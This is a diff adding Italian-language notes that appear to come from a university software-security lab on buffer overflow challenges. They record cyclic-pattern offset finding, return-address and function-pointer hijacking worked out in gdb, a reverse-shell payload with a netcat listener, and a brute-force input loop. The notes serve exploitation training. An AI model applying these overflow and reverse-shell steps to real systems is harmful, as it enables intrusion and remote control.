@@ -1,0 +1,74 @@
+Creazione payload cyclic per ottenere OFFSET, ottenimento posizione RSP (return address), 
+costruzione payload generator (slope + reverse shell + payload, + delta per eventuali shift nel ret addr) e exploitation
+
+
+unina@software-security:~/software-security/buffer-overflow/challenge$ python3 -c 'import sys; sys.stdout.write("2\n" + "A"*1022)' > payload
+unina@software-security:~/software-security/buffer-overflow/challenge$ cyclic -n 8 1200 >> payload 
+
+cyclic -n 8 1200 > payload_cyclic
+
+RSP add:		0x7fffffffda88 - 'ctaaaaaa'
+Cyclic offset: 		551
+			0x7fffffffda88 - 551 = 0x7fffffffd861
+
+
+nc -lvn 4444
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Eseguito programma con gdb, aggiunto break point sul main per far caricare il programma in memoria, 
+ottenuto l'indirizzo di write_secret e generato il payload per cambiare il return address
+
+pwndbg> print write_secret
+$1 = {void (void)} 0x555555555229 <write_secret>
+
+---------------------------------------------------------------------------------------------------------------------------------------
+32 BIT - attack put_wisdom()
+
+Procedimento analogo a 64 bit, ma ora cyclic substringhe univoche di 4 e non 8, 
+inoltre il return address da valutare è in EIP non ESP (RIP in amd64)
+
+
+cyclic -n 4 1200 >> payload 			 # ora 4 byte univoci invece di 8
+
+0xffffcc40 
+!!! stringa da valutare in EIP non ESP (RSP su 64 bit) ('fjaa')
+OFFSET: 535
+
+!!! nello shell code generator, bisogna impostare il registro edx, diverso dal valore di default
+Informazione reperibile nella documentazione del metodo .connect a:
+https://docs.pwntools.com/en/stable/shellcraft/i386.html#module-pwnlib.shellcraft.i386.linux
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Avviato programma in gdb, inserito breakpoint a riga 93 per caricare tutto in memoria, print delle variabili e &variabili per ottenere indirizzi, calcolo parametro i da passare in input per ottenere il puntatore 'p' e exploitation
+
+pwndbg> print &p
+$5 = (fptr *) 0xffffd04c
+pwndbg> print &ptrs
+$6 = (fptr (*)[3]) 0x56559094 <ptrs>
+
+pwndbg> print ptrs
+$2 = {0x0, 0x56556275 <get_wisdom>, 0x56556344 <put_wisdom>}
+pwndbg> print p
+$3 = (fptr) 0x56556241 <pat_on_back>
+
+dimensione di un element di ptrs = 4 B
+
+Calcolo i da passare in input:
+Target address: 	0xffffd04c
+Base address: 		0x56559094
+size_of_element: 	4 bytes
+
+0xffffd04c - 0x56559094 = 0xA9AA3FB8
+0xA9AA3FB8 / 4 = 0x2A6A8FEE = 711626734
+
+
+! Per OUTSIDE GDB:
+
+Pulisci env di gdb per avere indirizzi esatti a programma normale
+env -i gdb ./wisdom-alt-32
+
+Oppure Brute Force:
+for i in {711626720..711626780}; do echo "Trying $i"; echo $i | ./wisdom-alt-32; done
